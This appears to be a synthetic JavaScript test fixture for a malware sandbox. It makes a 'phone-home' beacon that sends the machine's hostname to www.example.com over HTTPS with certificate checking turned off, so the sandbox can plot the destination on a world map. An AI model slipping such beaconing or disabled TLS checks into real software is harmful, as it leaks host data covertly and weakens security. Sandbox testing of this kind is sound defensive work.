/**
 * SYNTHETIC phone-home beacon fixture — Claude Rabbit world-map / geolocation
 * proof (BUG-18). NOT real malware; authored locally; never published.
 *
 * On run it resolves a REAL, resolvable host and opens an outbound HTTPS beacon
 * to it with a small telemetry payload. Under the sandbox this is fully
 * contained: the trap's DNS is sinkholed and the connection is DNAT'd to the
 * trap, which terminates it — no real packet leaves the VM. The trap captures
 * the INTENDED host (www.example.com) from the SNI/Host header; the off-VM,
 * disposable analysis env then resolves that host to a real IP and geolocates
 * it, so the world map plots a REAL resolved country dot (not a guess).
 *
 * www.example.com is the RFC-2606 documentation domain — a safe, real,
 * resolvable target that exists precisely to be used in examples like this.
 */
'use strict';
const https = require('https');
const dns = require('dns');
const os = require('os');

const BEACON_HOST = 'www.example.com';
const payload = JSON.stringify({ event: 'beacon', host: os.hostname(), tag: 'cr-geo-proof' });

console.log('[phone-home] starting outbound beacon to', BEACON_HOST);
dns.lookup(BEACON_HOST, (err, address) => {
  console.log('[phone-home] resolved', BEACON_HOST, '->', err ? err.code : address);
  const req = https.request(
    {
      hostname: BEACON_HOST,
      port: 443,
      path: '/telemetry/checkin',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
      },
      timeout: 5000,
      // Accept the trap's throwaway sink cert so the TLS handshake completes and
      // the trap records the intended Host header (www.example.com) — that host
      // is what the off-VM analysis resolves + geolocates for the world map.
      rejectUnauthorized: false,
    },
    (res) => {
      console.log('[phone-home] beacon status', res.statusCode);
      res.resume();
    },
  );
  req.on('error', (e) => console.log('[phone-home] beacon error (expected under sinkhole):', e.code || e.message));
  req.on('timeout', () => {
    console.log('[phone-home] beacon timeout');
    req.destroy();
  });
  req.write(payload);
  req.end();
});

// Stay alive briefly so the run-phase beacon attempt is observed before exit.
setTimeout(() => {
  console.log('[phone-home] done');
  process.exit(0);
}, 8000);
